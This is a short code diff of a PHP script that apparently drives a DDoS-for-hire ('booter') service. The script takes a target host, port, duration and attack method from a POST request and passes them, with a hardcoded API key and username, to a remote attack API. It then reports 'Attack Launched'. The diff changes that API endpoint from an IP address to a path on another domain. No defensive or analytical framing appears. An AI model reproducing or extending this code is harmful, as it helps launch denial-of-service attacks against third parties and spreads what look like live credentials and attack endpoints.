@@ -16,7 +16,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
 
     $apiKey = "lizard@keis";
     $username = "lizardpredator";
-    $url = "http://159.65.143.83:8080/api?key=$apiKey&username=$username&host=$host&port=$port&time=$time&method=$method";
+    $url = "https://www.thedailywash.co.id/tesdt/api?key=$apiKey&username=$username&host=$host&port=$port&time=$time&method=$method";
 
     $response = file_get_contents($url);
     echo json_encode(['message' => 'Attack Launched']);
